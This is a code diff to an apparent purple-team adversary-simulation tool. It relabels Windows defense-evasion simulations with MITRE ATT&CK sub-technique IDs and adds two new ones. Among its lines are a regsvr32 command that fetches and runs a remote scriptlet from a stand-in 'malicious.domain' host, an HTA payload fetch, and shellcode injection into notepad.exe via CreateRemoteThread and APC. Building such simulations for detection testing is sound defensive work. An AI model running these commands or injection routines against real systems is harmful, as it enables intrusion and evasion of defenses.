@@ -16,7 +16,7 @@ namespace PurpleSharp.Simulations
         {
             string currentPath = AppDomain.CurrentDomain.BaseDirectory;
             Lib.Logger logger = new Lib.Logger(currentPath + log);
-            logger.SimulationHeader("T1191");
+            logger.SimulationHeader("T1218.003");
             try
             {
                 string file = @"C:\Users\Administrator\AppData\Local\Temp\XKNqbpzl.txt";
@@ -29,15 +29,34 @@ namespace PurpleSharp.Simulations
             }
         }
 
+        static public void Regsvr32(string log)
+        {
+            string currentPath = AppDomain.CurrentDomain.BaseDirectory;
+            Lib.Logger logger = new Lib.Logger(currentPath + log);
+            logger.SimulationHeader("T1218.010");
+            try
+            {
+                string url = @"http://malicious.domain:8080/payload.sct";
+                string dll = "scrobj.dll";
+                ExecutionHelper.StartProcess("", String.Format("regsvr32.exe /u /n /s /i:{0} {1}", url, dll), logger);
+                logger.SimulationFinished();
+            }
+            catch (Exception ex)
+            {
+                logger.SimulationFailed(ex);
+            }
+
+        }
+
         public static void InstallUtil(string log)
         {
             string currentPath = AppDomain.CurrentDomain.BaseDirectory;
             Lib.Logger logger = new Lib.Logger(currentPath + log);
-            logger.SimulationHeader("T1118");
+            logger.SimulationHeader("T1218.004");
             try
             {
                 string file = @"C:\Windows\Temp\XKNqbpzl.exe";
-                ExecutionHelper.StartProcess("", String.Format(@"C:\Windows\Microsoft.NET\Framework\v4.0.30319 /logfiles /LogToConsole=alse /U {0}", file), logger);
+                ExecutionHelper.StartProcess("", String.Format(@"C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfiles /LogToConsole=alse /U {0}", file), logger);
                 logger.SimulationFinished();
             }
             catch (Exception ex)
@@ -50,7 +69,7 @@ namespace PurpleSharp.Simulations
         {
             string currentPath = AppDomain.CurrentDomain.BaseDirectory;
             Lib.Logger logger = new Lib.Logger(currentPath + log);
-            logger.SimulationHeader("T1121");
+            logger.SimulationHeader("T1218.009");
             try
             {
                 string file = @"winword.dll";
@@ -87,7 +106,7 @@ namespace PurpleSharp.Simulations
         {
             string currentPath = AppDomain.CurrentDomain.BaseDirectory;
             Lib.Logger logger = new Lib.Logger(currentPath + log);
-            logger.SimulationHeader("T1170");
+            logger.SimulationHeader("T1218.005");
             try
             {
                 string url = "http://webserver/payload.hta";
@@ -139,7 +158,7 @@ namespace PurpleSharp.Simulations
         {
             string currentPath = AppDomain.CurrentDomain.BaseDirectory;
             Lib.Logger logger = new Lib.Logger(currentPath + log);
-            logger.SimulationHeader("T1085");
+            logger.SimulationHeader("T1218.011");
             try
             {
                 string file = @"C:\Windows\twain_64.dll";
@@ -156,7 +175,7 @@ namespace PurpleSharp.Simulations
         {
             string currentPath = AppDomain.CurrentDomain.BaseDirectory;
             Lib.Logger logger = new Lib.Logger(currentPath + log);
-            logger.SimulationHeader("T1070");
+            logger.SimulationHeader("T1070.001");
             logger.TimestampInfo("Using the command line to execute the technique");
             try
             {
@@ -173,7 +192,7 @@ namespace PurpleSharp.Simulations
         {
             string currentPath = AppDomain.CurrentDomain.BaseDirectory;
             Lib.Logger logger = new Lib.Logger(currentPath + log);
-            logger.SimulationHeader("T1070");
+            logger.SimulationHeader("T1070.001");
             logger.TimestampInfo("Using the System.Diagnostics .NET namespace to execute the technique");
 
             try
@@ -193,12 +212,11 @@ namespace PurpleSharp.Simulations
 
         }
 
-        public static void ProcessInjection(string log)
+        public static void PortableExecutableInjection(string log)
         {
             string currentPath = AppDomain.CurrentDomain.BaseDirectory;
             Logger logger = new Lib.Logger(currentPath + log);
-            logger.SimulationHeader("T1055");
-            
+            logger.SimulationHeader("T1055.002");
             try
             {
 
@@ -210,8 +228,6 @@ namespace PurpleSharp.Simulations
 
                 DefenseEvasionHelper.ProcInjection_CreateRemoteThread(Convert.FromBase64String(Lib.Static.donut_ping), proc, logger);
                 //DefenseEvasionHelper.ProcInjection_APC(Convert.FromBase64String(Lib.Static.donut_ping), proc, logger);
-
-                //DefenseEvasionHelper.ProcInjection_CreateRemoteThread(Lib.Static.msf_meter, not);
                 logger.SimulationFinished();
             }
             catch(Exception ex)
@@ -220,5 +236,30 @@ namespace PurpleSharp.Simulations
             }
             
         }
+
+        public static void AsynchronousProcedureCall(string log)
+        {
+            string currentPath = AppDomain.CurrentDomain.BaseDirectory;
+            Logger logger = new Lib.Logger(currentPath + log);
+            logger.SimulationHeader("T1055.004");
+
+            try
+            {
+
+                Process proc = new Process();
+                proc.StartInfo.FileName = "C:\\Windows\\system32\\notepad.exe";
+                proc.StartInfo.UseShellExecute = false;
+                proc.Start();
+                logger.TimestampInfo(String.Format("Process {0}.exe with PID:{1} started for the injection", proc.ProcessName, proc.Id));
+                DefenseEvasionHelper.ProcInjection_APC(Convert.FromBase64String(Lib.Static.donut_ping), proc, logger);
+                logger.SimulationFinished();
+            }
+            catch (Exception ex)
+            {
+                logger.SimulationFailed(ex);
+            }
+
+        }
+
     }
 }
